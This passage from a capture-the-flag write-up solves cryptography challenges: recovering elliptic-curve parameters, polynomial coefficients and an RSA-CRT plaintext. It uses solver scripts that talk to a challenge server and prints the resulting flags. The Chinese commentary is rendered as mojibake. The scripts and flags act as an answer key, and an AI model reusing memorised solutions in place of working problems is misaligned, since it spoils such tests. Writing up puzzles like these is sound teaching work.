u.&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;In the equation y^2 = x^3+ a*x + b (mod p), 4 points are given. Plz give me the right a, b or p to contine the game.&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Good Luck!\n&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        turn = random.choice(abp) </span><br><span class="line">        p = getPrime(pbits) </span><br><span class="line">        a,b = [next_prime(random.randint(<span class="number">2</span>,p)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>] </span><br><span class="line">        curve = EllipticCurve(GF(p),[a,b]) </span><br><span class="line">        pts = [curve.random_point() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        pts = [(_[<span class="number">0</span>], _[<span class="number">1</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> pts] </span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> pts:</span><br><span class="line">            <span class="built_in">print</span>(_,end=<span class="string">&quot; &quot;</span>) </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nGive me &#x27;</span>+turn+<span class="string">&quot; :&quot;</span>) </span><br><span class="line">        ans = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)) </span><br><span class="line">        <span class="keyword">if</span> check(a,b,p,turn,ans):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Good! Next challenge-&gt;\n&quot;</span>) </span><br><span class="line">            <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            pbits+=<span class="number">5</span>  </span><br><span class="line">            <span class="keyword">continue</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">            <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">            exit() </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Congrats! Your flag is:&#x27;</span>,flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">    exit() </span><br></pre></td></tr></table></figure></blockquote><p>ç±»ä¼¼LCGè®¡ç®— $a,b,p$ çš„æ–¹æ³•ï¼Œåˆ©ç”¨ç»“å¼è®¡ç®— $a,b,p$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> sage.matrix.matrix2 <span class="keyword">import</span> Matrix</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resultant</span>(<span class="params">f1, f2, var</span>):</span><br><span class="line">    <span class="keyword">return</span> Matrix.determinant(f1.sylvester_matrix(f2, var))</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="built_in">int</span>(<span class="number">8763</span>))</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Luck!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line"></span><br><span class="line">    (x1,y1),(x2,y2),(x3,y3),(x4,y4) = <span class="built_in">eval</span>(r.recvline().replace(<span class="string">b&#x27;) (&#x27;</span>, <span class="string">b&#x27;), (&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    PR.&lt;a,b,p,k1,k2,k3,k4&gt; = PolynomialRing(ZZ)</span><br><span class="line">    f1 = (y1^<span class="number">2</span>+k1*p)-(x1^<span class="number">3</span>+a*x1+b)</span><br><span class="line">    f2 = (y2^<span class="number">2</span>+k2*p)-(x2^<span class="number">3</span>+a*x2+b)</span><br><span class="line">    f3 = (y3^<span class="number">2</span>+k3*p)-(x3^<span class="number">3</span>+a*x3+b)</span><br><span class="line">    f4 = (y4^<span class="number">2</span>+k4*p)-(x4^<span class="number">3</span>+a*x4+b)</span><br><span class="line">    g1 = resultant(f1, f2, b)</span><br><span class="line">    g2 = resultant(f2, f3, b)</span><br><span class="line">    g3 = resultant(f3, f4, b)</span><br><span class="line">    h1 = resultant(g1, g2, a)</span><br><span class="line">    h2 = resultant(g2, g3, a)</span><br><span class="line">    p_gcd = gcd(h1(p=<span class="number">0</span>),h2(p=<span class="number">0</span>))</span><br><span class="line">    p = <span class="built_in">list</span>(<span class="built_in">zip</span>(*factor(p_gcd)))[<span class="number">0</span>][-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    PR.&lt;a,b&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">    f1 = y1^<span class="number">2</span>-(x1^<span class="number">3</span>+a*x1+b)</span><br><span class="line">    f2 = y2^<span class="number">2</span>-(x2^<span class="number">3</span>+a*x2+b)</span><br><span class="line">    g = resultant(f1, f2, b)</span><br><span class="line">    a = g.univariate_polynomial().roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    b = y1^<span class="number">2</span>-(x1^<span class="number">3</span>+a*x1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(f2(a,b))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;me &#x27;</span>)</span><br><span class="line">    op = r.recv(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(op)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> op == <span class="string">b&#x27;a&#x27;</span>:</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(a).encode())</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">b&#x27;b&#x27;</span>:</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(b).encode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(p).encode())</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Congrats! Your flag is: b&#x27;SYC&#123;ECC_M4ster&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Just-need-One"><a href="#Just-need-One" class="headerlink" title="Just need One"></a>Just need One</h3><blockquote><p>é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:2613 One bullet to kill all Outlaws.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>)</span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==DEBUG MODE==&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(): </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit() </span><br><span class="line">    <span class="built_in">print</span>(banner) </span><br><span class="line">    parms = [random.getrandbits(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)] </span><br><span class="line">    res = res = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Give me x calculating f(x) :\n&gt; &#x27;</span>))  </span><br><span class="line">    <span class="keyword">if</span> res &gt;= <span class="number">2</span>**<span class="number">32</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Give me something smaller.\n&quot;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">        exit() </span><br><span class="line"></span><br><span class="line">    cnt = <span class="number">0</span>  </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>): </span><br><span class="line">        cnt += <span class="built_in">pow</span>(res,_)*parms[_]  </span><br><span class="line">    <span class="built_in">print</span>(cnt) </span><br><span class="line">    ans = <span class="built_in">input</span>(<span class="string">&#x27;Give me Coefficients :\n&gt; &#x27;</span>) </span><br><span class="line">    ans = [<span class="built_in">int</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> ans.split(<span class="string">&quot;,&quot;</span>)] </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ans == parms:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Congrats! Your flag is:&#x27;</span>,flag)  </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">    exit() </span><br></pre></td></tr></table></figure></blockquote><p>æœ¬è´¨æ˜¯è¿›åˆ¶è½¬æ¢çš„è®¡ç®—æ–¹æ³•ï¼Œæä¾› $x$ åç»™å‡º $\sum\limits_{i=0}^{128}p_ix^i$ï¼Œæ±‚å„ $p_i$ã€‚åˆ©ç”¨å–ä½™å’Œæ•´é™¤è®¡ç®—å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">2613</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">x = <span class="number">4294967295</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;4294967295&#x27;</span>)</span><br><span class="line">c = <span class="built_in">eval</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">param = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">     param.append(c % x)</span><br><span class="line">     c = (c-param[-<span class="number">1</span>])//x</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(param).encode().strip(<span class="string">b&#x27;[&#x27;</span>).strip(<span class="string">b&#x27;]&#x27;</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Fi1nd-th3-xâ€™"><a href="#Fi1nd-th3-xâ€™" class="headerlink" title="Fi1nd_th3_xâ€™"></a>Fi1nd_th3_xâ€™</h3><blockquote><p>å¬è¯´åœ¨é‚£ä¸ªå¤§é™†æœ‰ä½å«jrl777çš„æ—…è¡Œè€…â€¦â€¦Cryptoerç©¿è¶Šåˆ°äº†æç“¦ç‰¹å°±è¦æ‹¿å‡ºçœŸæœ¬äº‹ï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span>* </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line">e = getPrime(<span class="number">32</span>)</span><br><span class="line">n = p*q*r</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">dP = d%((q-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">dQ = d%((p-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">dR = d%((p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = s2n(flag.encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q=&#x27;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r=&#x27;</span>,r)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dP=&#x27;</span>,dP)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dQ=&#x27;</span>,dQ)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dR=&#x27;</span>,dR)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= 13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343</span></span><br><span class="line"><span class="string">q= 12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667</span></span><br><span class="line"><span class="string">r= 12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419</span></span><br><span class="line"><span class="string">dP= 116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941</span></span><br><span class="line"><span class="string">dQ= 44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797</span></span><br><span class="line"><span class="string">dR= 60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921</span></span><br><span class="line"><span class="string">c= 93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>ç”±äº $m&lt;qr,m&lt;pr,m&lt;pq$ï¼Œæ•… $m=c^{dP} \bmod {qr}=c^{dQ} \bmod {pr}=c^{dR} \bmod {pq}$ï¼Œå¦åˆ™éœ€åº”ç”¨CRTæ¥æ±‚ $m$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p= <span class="number">13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343</span></span><br><span class="line">q= <span class="number">12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667</span></span><br><span class="line">r= <span class="number">12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419</span></span><br><span class="line">dP= <span class="number">116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941</span></span><br><span class="line">dQ= <span class="number">44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797</span></span><br><span class="line">dR= <span class="number">60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921</span></span><br><span class="line">c= <span class="number">93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009</span></span><br><span class="line"></span><br><span class="line">m1=<span class="built_in">pow</span>(c,dP,q*r)</span><br><span class="line">m2=<span class="built_in">pow</span>(c,dQ,p*r)</span><br><span class="line">m3=<span class="built_in">pow</span>(c,dR,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m1)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;CRT_1s_f3n_but_Gen3hi_im9act_is_a_balabalaba&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Quick-Robert"><a href="#Quick-Robert" class="headerlink" title="Quick_Robert"></a>Quick_Robert</h3><blockquote><p>é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:3042 <a href="https://en.wikipedia.org/wiki/Quadratic_residue">https://en.wikipedia.org/wiki/Quadratic_residue</a></p></blockquote><p>å‚è€ƒ <a href="https://imomath.com/index.cgi?page=quadraticCongruencesSumsLegendreSymbols">Some sums of Legendreâ€™s symbols</a>ï¼Œåˆ©ç”¨äºŒæ¬¡å‰©ä½™çš„æ±‚å’Œç‰¹æ€§è®¡ç®—ï¼š</p><p>$\sum\limits_{x=0}^{p-1}\left(\cfrac{ax^2+bx+c}p\right) = \left\{\begin{array}{cl}-\left(\cfrac ap\right),&amp; p \nmid b^2-4ac \newline (p-1)\left(\cfrac ap\right),<br>&amp; p \mid b^2-4ac \end{array}\right.$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">3042</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;success!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 